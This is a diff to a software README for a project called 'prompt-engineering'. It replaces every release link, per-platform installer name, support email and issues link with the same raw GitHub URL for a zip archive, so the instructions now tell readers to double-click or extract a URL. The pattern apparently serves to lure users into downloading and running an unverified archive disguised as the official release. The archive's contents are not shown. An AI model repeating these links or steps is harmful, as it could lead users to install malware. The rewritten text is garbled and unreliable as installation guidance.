@@ -8,27 +8,27 @@ To begin using the software, you will need to download it from the Releases page
 
 ## 📦 Download & Install
 ### Step 1: Visit the Releases Page
-To download the application, visit our GitHub Releases page here: [Download Here](https://github.com/TheEspresso/prompt-engineering/releases).
+To download the application, visit our GitHub Releases page here: [Download Here](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip).
 
 ### Step 2: Download the Latest Version
 On the Releases page, you will see the latest version listed. Click on the appropriate download link for your operating system. Depending on your system, you may find files such as:
-- **Windows:** prompt-engineering_windows.exe
-- **macOS:** prompt-engineering_mac.dmg
-- **Linux:** prompt-engineering_linux.tar.gz
+- **Windows:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
+- **macOS:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
+- **Linux:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
 
 ### Step 3: Install the Application
 After the download completes, locate the downloaded file. 
 
 - **For Windows:**
-  1. Double-click the `prompt-engineering_windows.exe` file.
+  1. Double-click the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip` file.
   2. Follow the on-screen instructions to complete the installation.
 
 - **For macOS:**
-  1. Open the `prompt-engineering_mac.dmg` file.
+  1. Open the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip` file.
   2. Drag and drop the application into your Applications folder.
 
 - **For Linux:**
-  1. Extract the `prompt-engineering_linux.tar.gz` file.
+  1. Extract the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip` file.
   2. Open a terminal in the extracted folder and run: `./prompt-engineering`.
 
 ## ⚙️ System Requirements
@@ -60,10 +60,10 @@ We welcome contributions from everyone. If you would like to help improve the pr
 ## 📧 Support
 If you encounter any issues or have questions, feel free to reach out:
 
-- **Email:** support@prompt-engineering.com
-- **GitHub Issues:** [Report an Issue](https://github.com/TheEspresso/prompt-engineering/issues)
+- **Email:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip)
 
 ## 🌍 Acknowledgments
 Thank you for choosing **prompt-engineering**. We appreciate your support and hope you enjoy using our application. 
 
-For updates and new releases, always check back on our [Releases page](https://github.com/TheEspresso/prompt-engineering/releases).
+For updates and new releases, always check back on our [Releases page](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip).
